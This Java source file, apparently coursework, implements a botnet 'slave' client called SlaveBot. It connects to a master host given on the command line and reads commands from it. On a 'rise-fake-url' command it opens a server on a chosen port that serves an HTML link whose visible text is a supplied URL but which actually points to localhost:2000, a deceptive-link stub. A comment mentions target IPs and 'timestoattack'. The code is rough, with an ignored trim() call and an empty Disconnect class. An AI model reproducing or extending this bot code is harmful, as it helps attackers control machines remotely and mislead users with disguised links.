import java.io.BufferedReader;
import java.io.IOException;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Random;


public class SlaveBot {

	public static void main(String[] args) throws Exception {
		String hostname;
		int portnumber;
		Socket slave;
		
		if (args.length == 0) {
			System.out.println("Please enter an valid command (-h IPAddress|Hostname -p port)");
			return;
		} else if (args[0].equals("-h") && args[2].equals("-p")) {
			hostname = args[1];
			portnumber = Integer.parseInt(args[3]);
		} else {
			System.out.println("Please enter an valid command (-h IPAddress|Hostname -p port)");
			return;
		}

		System.out.printf("Slave registered %s %n",hostname);		
		slave = new Socket(hostname, portnumber);
		String message = "";

		
		try {
            BufferedReader in = new BufferedReader(new InputStreamReader(slave.getInputStream()));
			PrintWriter out = new PrintWriter(slave.getOutputStream(), true);

			String msin = "";
			while (!msin.equals("exit")) {
				msin = in.readLine();
				out.println(msin);
				System.out.println("S: " + msin);
                
                msin.trim();
				String[] splited = msin.split(" ");

				//command slaveip targetip targetport timestoattack
				String command = splited[0].substring(1);; // Slave
   
                String port = "";
                String url = "";
                if (splited.length >= 3) {
                    port = splited[1]; // Target
                    url = splited[2];                   
                }

					
				if (command.equals("rise-fake-url")) {
                    new Connect(port, url).start();
                    System.out.println(port);
                    System.out.println(url);
                }
			}
		}
		catch (Exception e) {
			System.out.println(e.toString());
			slave.close();
			System.exit(-1);
		}
}

	static class Connect extends Thread {
                    
        private int port;
        private String url;
            
        public Connect (String port, String url) {
            this.port = Integer.parseInt(port);
            this.url = url;
        }
                    
        public void run() {
            try {
				ServerSocket master = new ServerSocket(port);
				while (true) {
					Socket slave = master.accept();
                    System.out.println("A client connected.");
                    PrintWriter out = new PrintWriter(slave.getOutputStream()); 

                    out.println("HTTP/1.1 200 OK"); 
                    out.println("Content-Type: text/html"); 
                    out.println("\r\n"); 
                    out.println("<a href=\"http://localhost:2000/\">" + url + "</a>");
                    out.flush();
				}
			} catch (Exception e) {
				System.exit(-1);
			}
        }
	}

	static class Disconnect extends Thread {
        private String[] splited;
            
        public Disconnect (String[] splited) {
            this.splited = splited;
        }
        
		public void run() {
			try {

			} catch (Exception e) {
				System.out.println(e.toString());
				System.exit(-1);
			}
		}
	}
}
